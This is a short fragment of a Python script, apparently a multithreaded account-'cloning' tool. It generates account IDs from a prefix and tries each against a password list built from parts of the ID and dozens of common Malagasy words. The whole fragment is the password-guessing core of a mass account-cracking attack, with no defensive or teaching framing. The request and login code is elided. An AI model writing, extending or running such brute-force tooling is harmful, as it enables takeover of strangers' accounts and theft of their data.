...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'fitiavana','Fitiavana','fanilo!','Fanilo','malala','Malala','papako','Papako','mahery','Mahery','nirina','nirina','sarika','Sarika','mamiko','Mamiko','felana','Felana','mahandry','Mahandry','valimbavaka','Valimbavaka','zanako','Zanako','anjara','Anjara','mamako','Mamako','fitiavako','Fitiavako','nomena','Nomena','nilaina','Nilaina','narovana','Narovana','Tantely','tantely','tolotra','anjarako','jesosy','jesosy','fandresena','Fandresena','harena','Harena','nekena','Nekena','mahefa','Mahefa','harena','Harena','Fiderana','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena']
